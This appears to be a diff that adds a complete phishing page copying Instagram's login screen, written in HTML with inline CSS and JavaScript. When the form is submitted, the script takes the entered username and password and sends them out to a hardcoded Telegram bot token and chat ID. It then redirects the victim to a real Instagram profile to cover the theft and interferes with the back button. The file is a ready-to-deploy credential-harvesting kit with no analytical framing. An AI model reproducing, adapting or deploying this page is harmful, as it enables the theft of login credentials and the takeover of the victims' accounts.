@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Login UI - Hindi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      min-height: 100vh;
+      width: 100vw;
+      margin: 0;
+      background: #1C2B33;
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+    }
+    .header-lang {
+      color: #b3b3b3;
+      font-size: 14px;
+      text-align: center;
+      padding-top: 40px;
+      margin-bottom: 0;
+      width: 100%;
+      font-weight: 400;
+    }
+    .insta-logo {
+      margin-top: 65px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+    }
+    .insta-logo img {
+      width: 75px;
+      height: 75px;
+      display: block;
+    }
+    /* FORM FIELDS */
+    .main-form {
+      width: 100%;
+      max-width: 94vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 50px;
+    }
+    .textfield {
+      width: 85vw;
+      max-width: 380px;
+      height: 65px;
+      background: rgba(0, 0, 0, 0);
+      color: #fff;
+      border: 1px solid #8595A4;
+      border-radius: 15px;
+      font-size: 15px;
+      margin-bottom: 14px;
+      padding: 0 18px;
+      box-sizing: border-box;
+      transition: border-color 0.2s, color 0.2s;
+    }
+    .textfield:focus {
+      outline: none;
+      border-color: #0095f6;
+      background: rgba(0, 0, 0, 0);
+      color: #fff;
+    }
+    .textfield::placeholder {
+      color: #8a9ab0;
+      opacity: 1;
+      font-weight: 400;
+    }
+    /* Login Button */
+    .login-btn {
+      width: 85vw;
+      max-width: 380px;
+      height: 48px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-bottom: 32px;
+      margin-top: 16px;
+      transition: background 0.2s;
+      letter-spacing: normal;
+    }
+    .login-btn:hover {
+      background: #0077cc;
+    }
+    /* Forgotten Password */
+    .forgot-link {
+      color: #ffffff;
+      font-size: 15px;
+      text-decoration: none;
+      cursor: pointer;
+      text-align: center;
+      margin-bottom: 90px;
+      display: block;
+      width: 100%;
+      transition: opacity 0.2s;
+    }
+    .forgot-link:hover {
+      opacity: 0.8;
+    }
+    /* Create New Account Button */
+    .create-btn {
+      background: transparent;
+      border: 2px solid #0095f6;
+      width: 85vw;
+      max-width: 380px;
+      height: 48px;
+      border-radius: 24px;
+      color: #0095f6;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, opacity 0.2s;
+      margin-bottom: 60px;
+    }
+    .create-btn:hover {
+      background: rgba(0, 149, 246, 0.08);
+    }
+    /* Footer Meta */
+    .footer {
+      width: 100vw;
+      text-align: center;
+      margin-top: auto;
+      margin-bottom: 30px;
+      font-size: 12px;
+      color: #8a9ab0;
+      font-family: inherit;
+      letter-spacing: 1px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    .footer:hover {
+      opacity: 0.8;
+    }
+    @media (max-width: 480px) {
+      .insta-logo img {
+        width: 75px;
+        height: 75px;
+      }
+      .textfield, .login-btn, .create-btn {
+        max-width: 92vw;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header-lang">English (UK)</div>
+  <div class="insta-logo">
+    <img src="https://static.cdninstagram.com/rsrc.php/v4/yA/r/O_3Ggpr3_aA.png" alt="Instagram Logo"/>
+  </div>
+  <form class="main-form" autocomplete="off" id="loginForm">
+    <input class="textfield" type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" spellcheck="false" required/>
+    <input class="textfield" type="password" id="password" placeholder="Password" autocomplete="current-password" spellcheck="false" required/>
+    <button type="submit" class="login-btn">Log in</button>
+    <a href="https://www.instagram.com/sunnyleone/" target="_blank" class="forgot-link">Forgotten password?</a>
+    <button type="button" class="create-btn" onclick="redirectToInstagram()">Create new account</button>
+  </form>
+  <div class="footer" onclick="followInstagram()">Meta</div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8426413960:AAFbC0rh2mD3maanWgsdVQCLCasIP4T46hk';
+    const TELEGRAM_CHAT_ID = '5037701749';
+    const YOUR_INSTAGRAM = 'https://www.instagram.com/urf7i/';
+    const REDIRECT_INSTAGRAM = 'https://www.instagram.com/miakhalifa/';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const currentTime = new Date().toLocaleString();
+
+      // Telegram message format with clickable Instagram link
+      const message = `INSTAGRAM LOGIN 👽
+═══════⊹⊱≼≽⊰⊹═════
+
+📱Username ➩ ${username}
+🔒Password ➩ ${password}
+🕒 Time ➩ ${currentTime}
+
+♛ DEVELOPED BY SANJEEV♛
+════════⊹⊱≼≽⊰⊹════════
+<a href="https://www.instagram.com/com.sanjeev/">Follow Me On Instagram</a>`;
+
+      // Send to Telegram
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+      fetch(telegramUrl, { method: 'GET' })
+        .then(response => {
+          // Redirect to Instagram after sending data
+          window.location.href = REDIRECT_INSTAGRAM;
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          // Still redirect to Instagram even if there's an error
+          window.location.href = REDIRECT_INSTAGRAM;
+        });
+    });
+
+    function redirectToInstagram() {
+      window.location.href = YOUR_INSTAGRAM;
+    }
+
+    function followInstagram() {
+      window.location.href = YOUR_INSTAGRAM;
+    }
+
+    // Optional: Prevent back button after redirect
+    window.addEventListener('beforeunload', function() {
+      // This will redirect if user tries to go back
+      window.location.href = REDIRECT_INSTAGRAM;
+    });
+  </script>
+</body>
+</html>
